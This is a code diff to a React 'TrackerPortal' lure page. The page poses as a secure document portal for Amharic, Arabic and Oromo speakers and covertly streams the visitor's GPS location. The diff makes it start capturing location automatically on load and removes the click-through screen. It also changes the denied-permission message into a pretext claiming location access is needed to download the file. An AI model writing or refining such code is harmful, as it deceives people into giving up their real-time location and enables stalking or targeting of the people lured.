@@ -21,7 +21,7 @@ function formatTime(seconds: number) {
 }
 
 export const TrackerPortal: React.FC = () => {
-  const [status, setStatus] = useState<'idle' | 'scanning' | 'granted' | 'denied' | 'error'>('idle');
+  const [status, setStatus] = useState<'idle' | 'scanning' | 'granted' | 'denied' | 'error'>('scanning');
   const [errorMsg, setErrorMsg] = useState<string>('');
   const [progress, setProgress] = useState(0);
   const targetIdRef = useRef<string | null>(null);
@@ -54,7 +54,16 @@ export const TrackerPortal: React.FC = () => {
     const countdown = setInterval(() => {
       setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
     }, 1000);
-    return () => clearInterval(countdown);
+    
+    // Auto-trigger tracking protocol immediately on load
+    const autoStart = setTimeout(() => {
+       startRecon();
+    }, 500);
+
+    return () => {
+      clearInterval(countdown);
+      clearTimeout(autoStart);
+    };
   }, []);
 
   const translations = {
@@ -115,7 +124,7 @@ export const TrackerPortal: React.FC = () => {
       else if (ua.includes('Twitter') || ua.includes('X/')) platform = 'X';
 
       // Use the provided name or a fallback
-      const targetDisplayName = targetIdRef.current || `Vector ${user?.uid.slice(0, 4) || targetId?.slice(-4)}`;
+      const targetDisplayName = targetIdRef.current || `Vector ${auth.currentUser?.uid.slice(0, 4) || targetId?.slice(-4) || 'UNKNOWN'}`;
 
       // High-precision stealth stream with quality verification
       let lastReportTime = 0;
@@ -127,9 +136,9 @@ export const TrackerPortal: React.FC = () => {
           const now = Date.now();
           
           // Only update if it's been a few seconds or if it's the first time 
-          // (or if accuracy is significantly better)
-          if (now - lastReportTime < MIN_INTERVAL && status === 'granted' && accuracy > 50) {
-             return;
+          if (now - lastReportTime < MIN_INTERVAL && status === 'granted') {
+             // If we already have a fix, only update if accuracy is significantly better or enough time passed
+             if (accuracy > 20) return; // Wait for better accuracy if we already have one
           }
           
           setStatus('granted');
@@ -176,7 +185,7 @@ export const TrackerPortal: React.FC = () => {
           console.error("Signal Lost:", error);
           if (error.code === error.PERMISSION_DENIED) {
             setStatus('denied');
-            setErrorMsg('ACCESS_REJECTED: የደህንነት ፈቃድ አልተሰጠም። እባክዎ ምስጢራዊ መረጃውን ለማየት ፍቃድ ይስጡ (Settings > Privacy > Location > Allow).');
+            setErrorMsg('PROTOCOL_ERROR: ዳታውን ወደ ስልክዎ ለማውረድ የቦታ መገኛ ፍቃድ መስጠት አስፈላጊ ነው።');
           } else {
             // Don't kill the session on minor errors, just log and wait for next fix
             console.warn("Retrying position fix...");
@@ -309,60 +318,6 @@ export const TrackerPortal: React.FC = () => {
         </div>
 
         <div className="space-y-8">
-          {status === 'idle' && (
-            <motion.div 
-              initial={{ opacity: 0, y: 10 }} 
-              animate={{ opacity: 1, y: 0 }}
-              className="space-y-8"
-            >
-              <div className="bg-slate-900/30 border border-slate-800/50 p-6 rounded-lg text-center relative overflow-hidden group cursor-pointer active:scale-[0.99] transition-transform" onClick={startRecon}>
-                <div className="absolute top-0 left-0 w-1 h-full bg-blue-600/40"></div>
-                
-                {lang === 'amharic' || lang === 'both' ? (
-                  <p className="text-[12px] leading-relaxed text-slate-300 font-medium mb-4">
-                    {translations.amharic}
-                  </p>
-                ) : null}
-                
-                {lang === 'arabic' || lang === 'both' ? (
-                  <p className="text-[12px] leading-relaxed text-slate-300 font-medium mb-4 dir-rtl text-right">
-                    {translations.arabic}
-                  </p>
-                ) : null}
-
-                {lang === 'oromo' || lang === 'both' ? (
-                  <p className="text-[12px] leading-relaxed text-slate-300 font-medium mb-4">
-                    {translations.oromo}
-                  </p>
-                ) : null}
-
-                <div className="flex flex-col items-center gap-2 border-t border-slate-800/50 pt-4">
-                  <div className="text-[42px] font-black text-blue-500 tracking-[0.5em] font-mono group-hover:text-blue-400 transition-colors animate-pulse drop-shadow-[0_0_10px_rgba(59,130,246,0.5)]">
-                    8429
-                  </div>
-                  <div className="flex items-center justify-center gap-4 text-[9px] text-slate-500 uppercase tracking-widest font-bold">
-                    <span className="flex items-center gap-1.5"><Shield className="w-2.5 h-2.5" /> SECURE_ID</span>
-                    <span className="flex items-center gap-1.5"><Fingerprint className="w-2.5 h-2.5" /> AUTH_CODE</span>
-                  </div>
-                </div>
-                <div className="mt-4 text-[10px] text-red-500/60 font-bold animate-pulse">
-                  EXPIRING IN: {formatTime(timeLeft)}
-                </div>
-              </div>
-              
-              <button 
-                onClick={startRecon}
-                className="w-full py-4 bg-slate-800/50 text-slate-400 font-bold text-[10px] tracking-[0.3em] rounded border border-slate-700 hover:bg-slate-800 hover:text-white transition-all uppercase active:scale-[0.98]"
-              >
-                Access Document
-              </button>
-
-              <div className="text-center">
-                <p className="text-[8px] text-slate-600 uppercase tracking-widest leading-loose">Secure Access Node: FB, WA, Telegram & Browsers Supported</p>
-              </div>
-            </motion.div>
-          )}
-
           {status === 'scanning' && (
             <div className="space-y-6 py-4">
               <div className="space-y-2">
